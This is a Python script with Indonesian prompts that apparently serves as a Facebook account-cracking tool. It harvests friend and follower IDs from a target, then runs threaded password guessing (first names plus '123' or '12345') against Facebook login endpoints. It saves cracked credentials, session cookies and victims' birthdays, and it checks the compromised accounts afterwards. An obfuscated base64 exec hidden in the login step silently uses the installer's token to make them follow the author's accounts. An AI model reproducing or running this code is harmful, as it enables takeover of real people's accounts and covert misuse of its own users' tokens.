# -*- coding: utf-8
# Author by Summer Sierra 
import os
try:
	import requests
except ImportError:
	print("\n ! MODULE REQUESTS BELUM TERINSTALL ")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n ! MODULE BS4 BELUM TERINSTALL")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n ! MODULE FUTURES BELUM TERINSTALL")
	os.system("pip install futures")

import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

def logo():
	os.system("clear")
	print(" \033[0;91m  ___  _   _ _____ _____ _   _  \n \033[0;91m / _ \| | | | ____| ____| \ | |\n \033[0;91m| | | | | | |  _| |  _| |  \| |\n \033[0;91m| |_| | |_| | |___| |___| |\  |\n \033[0;91m \__\_v\___/|_____|_____|_| \_/ \n \033[0;97m__________   _     \n \033[0;97m|__  /__  /  / \      \n \033[0;97m  / /  / /  / _ \    \n \033[0;97 /   /_ / /_ / ___ \  \n \033[0;97m/____/____/_/   \_\  BY Summer Sierra \n")

def login():
	os.system("clear")
	try:
		#-> test koneksi
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit(" ! TIDAK ADA KONEKSI INTERNET")
	try:
		token = open("login.txt", "r")
		menu()
	except (KeyError, IOError):
		print(" * SEBELUM MASUK KE MENU HARUS LOGIN TERLEBIH DAHULU")
		print(" * UNTUK LOGIN SILAHKAN MASUKKAN TOKEN FACEBOOK ANDA")
		print(" ? KETIK '\033[0;93mgithub\033[0;97m' UNTUK LIHAT GITHUB SAYA")
		token = raw_input("\n + TOKEN FB : ")
		if token == "github":
			os.system("xdg-open https://github.com/QUEEN-ZZA")
			exit(" ! TERIMA KASIH")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			import base64
			exec(base64.b64decode("cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDAxNDcyODU0ODY0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDA0NDQ2Mzg2Nzcvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAyMjg0MTk4MzQxNC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbik="))
			open("login.txt", "w").write(token)
			print("\n + user aktif, SELAMAT DATANG \033[0;93m%s\033[0;97m"%(nama))
			time.sleep(1)
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit(" ! TOKEN KADALUWARSA")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit(" ! TOKEN KADALUWARSA")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
	except IOError:
		os.system("rm -f login.txt")
		exit(" ! TOKEN KADALUWARSA")
	except requests.exceptions.ConnectionError:
		exit(" ! TIDAK ADA KONEKSI INTERNET")
	logo()
	print(" [ SELAMAT DATANG \033[0;93m%s\033[0;97m ]\n"%(nama))
	print(" [1] MULUNG DARI PUBLIK TEMAN")
	print(" [2] MULUNG DARI PENGIKUT PUBLIK")
	print(" [3] MULUNG DARI TARGET MASSAL")
	print(" [4] LIHAT HASIL MULUNG")
	print(" [5] CEK OPSI HASIL MULUNG")
	print(" [6] SETTING USER-AGENT")
	print(" [0] KELUAR (HAPUS TOKEN)")
	queen = raw_input("\n [?] PILIH : ")
	if queen == "":
		menu()
	elif queen == "1" or queen == "01":
		publik()
		method()
	elif queen == "2" or queen == "02":
		follower()
		method()
	elif queen == "3" or queen == "03":
		massal()
		method()
	elif queen == "4" or queen == "04":
		print("\n 1 CEK HASIL [OK]")
		print(" 2 CEK HASIL [CP]")
		cek = raw_input("\n ? choose : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print(" * LIST NAMA FILE TERSIMPAN DI FOLDER OK")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n ? PILIH NAMA FILE : ")
				if file == "":
					menu()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! FILE %s TIDAK TERSEDIA "%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" + HASIL MULUNG : %s TOTAL : %s\033[0;92m"%(del_txt, len(totalok)))
			os.system("cat OK/%s"%(file))
			print("\033[0;97m # ----------------------------------------------")
			exit(" ! JANGAN LUPA DI COPY DAN DI SIMPAN HASILNYA")
		elif cek == "2":
			dirs = os.listdir("CP")
			print(" * LIST NAMA FILE TERSIMPAN DI FOLDER CP")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n ? PILIH NAMA FILE : ")
				if file == "":
					menu()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! FILE %s TIDAK TERSEDIA"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" + HASIL MULUNG : %s TOTAL : %s\033[0;93m"%(del_txt, len(totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;97m # ----------------------------------------------")
			exit(" ! JANGAN LUPA DI COPY DAN DI SIMPAN HASILNYA")
		else:
			menu()
	elif queen == "5" or queen == "05":
		cek_opsi()
	elif queen == "6" or queen == "06":
		setting_ua()
	elif queen == "0" or queen == "00":
		os.system("rm -f login.txt")
		exit("\n # BERHASIL MENGHAPUS TOKEN")
	else:
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! TOKEN KADALUWARSA")
	print("\n * ISI 'me' JIKA INGIN DARI DAFTAR TEMAN ")
	idt = raw_input(" + ID TARGET : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ! AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
	print(" + TOTAL ID  : \033[0;91m%s\033[0;97m"%(len(id))) 

def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! TOKEN KADALUWARSA")
	print("\n * ISI 'me' JIKA INGIN DARI PENGIKUT SENDIRI")
	idt = raw_input(" + ID TARGET : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ! AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! TOKEN KADALUWARSA a")
	try:
		tanya_total = int(raw_input(" + JUMLAH TARGET ID : "))
	except:tanya_total=1
	print("\n * ISI 'me' JIKA INGIN DARI DAFTAR TEMAN")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" + ID TARGET %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" ! AKUN TIDAK TERSEDIA ATAU LIST TEMAN PRIVASI")
	print(" + TOTAL ID  : \033[0;91m%s\033[0;97m"%(len(id)))

def method():
	print(" \n [ PILIH METHODE MULUNG - COBA METHODE SATU² ]\n")
	print(" 1 METHODE B-API (MULUNG CEPAT)")
	print(" 2 METHODE MBASIC (MULUNG LAMBAT)")
	print(" 3 METHODE MOBILE (MULUNG LAMBAT)")
	method = raw_input("\n + METHODE : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input(" ? GUNAKAN PASSWORD MANUAL? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n * CONTOH PASS : sayang,bismillah,terserah")
				qza = raw_input(" ? SET PASS : ").split(",")
				if len(qza) =="":
					exit(" ! JANGAN KOSONG")
				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN mode PESAWAT 5 DETIK\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, qza)
			exit("\n\n # MULUNG SELESAI...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name)<=2:
						pwx = [ name+"123", name+"12345" ]
					elif len(name)<=3:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					coeg.submit(api, uid, pwx)
			exit("\n\n # MULUNG SELESAI...")
	elif method == "2":
		ask = raw_input(" ? GUNAKAN PASSWORD MANUAL? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n * CONTOH PASS : sayang,bismillah,terserah")
				qza = raw_input(" ? SET PASS : ").split(",")
				if len(qza) =="":
					exit(" ! JANGAN KOSONG")
				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(mbasic, uid, qza)
			exit("\n\n # MULUNG SELESAI...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=35) as coeg:
				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK \n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name)<=2:
						pwx = [ name+"123", name+"12345" ]
					elif len(name)<=3:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					coeg.submit(mbasic, uid, pwx)
			exit("\n\n # MULUNG SELESAI...")
	elif method == "3":
		ask = raw_input(" ? GUNAKAN PASSWORD MANUAL? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n * CONTOH PASS : sayang,bismillah,terserah")
				qza = raw_input(" ? SET PASS : ").split(",")
				if len(qza) =="":
					exit(" ! JANGAN KOSONG")
				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MOD PESAWAT 5 DETIK\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(mobile, uid, qza)
			exit("\n\n # MULUNG SELESAI...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n + HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" + HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" ! JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 5 DETIK\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name)<=2:
						pwx = [ name+"123", name+"12345" ]
					elif len(name)<=3:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					coeg.submit(mobile, uid, pwx)
			exit("\n\n # MULUNG SELESAI...")
		else:
			exit("\n ! ISI YANG BENAR")
	else:
		menu() 

def api(uid, pwx):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r * MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasic(uid, pwx):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r * MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobile(uid, pwx):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r * MULUNG %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def setting_ua():
	print("\n [1] GANTI USER AGENT TOOLS")
	print(" [2] GUNAKAN USER AGENT DEFAULT")
	print(" [3] LIHAT USER AGENT ANDA")
	ua = raw_input("\n [?] PILIH : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = raw_input(" + USER AGENT : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n + BERHASIL GANTI USER AGENT")
		menu()
	elif ua == "2":
		print(" + USER AGENT : Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		time.sleep(1)
		raw_input("\n + BERHASIL GANTI USER AGENT")
		menu()
	elif ua == "3":
		os.system("xdg-open https://myuseragent.herokuapp.com/")
		print(" ! TUNGGU SEBENTAR...")
		time.sleep(1)
		raw_input("\n + ENTER UNTUK KEMBALI KE MENU")
		menu()

#-> Cek Opsi
def cek_opsi():
	print("\n * MASUKKAN FILE (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" ? NAMA FILE  : ")
	if files == "":
		menu()
	try:
		akubfile = open(files, "r").readlines()
	except IOError:
		exit("\n ! NAMA FILE %s TIDAK TERSEDIA"%(files))
	print(" + TOTAL AKUN : \033[0;91m%s\033[0;97m"%(len(akubfile)))
	print(" * SEDANG PROSES CEK AKUN....")
	for shanoza in akubfile:
		gheza = shanoza.replace("\n","")
		qolby  = gheza.split("|")
		print("\n + CEK AKUN : \033[0;93m%s\033[0;97m"%(gheza.replace(" + ","")))
		try:
			check_in(qolby[0].replace(" + ",""), qolby[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n ! CEK AKUN SUDAH SELESAI...")
	raw_input(" + TEKAN ENTER UNTUK KEMBALI KE MENU")
	time.sleep(1)
	menu()

def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" + APLIKASI TERHUBUNG ADA : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		qnza = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		noza = [yy.text for yy in qnza.find_all("option")]
		print(" + TERDAPAT "+str(len(noza))+" OPSI ")
		for opt in range(len(noza)):
			print("   "+str(opt+1)+" "+noza[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" ! %s"%(oh))
	else:
		print(" ! LOGIN GAGAL, SILAHKAN CEK KEMBALI ID DAN PASSWORD")
	
def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	login()
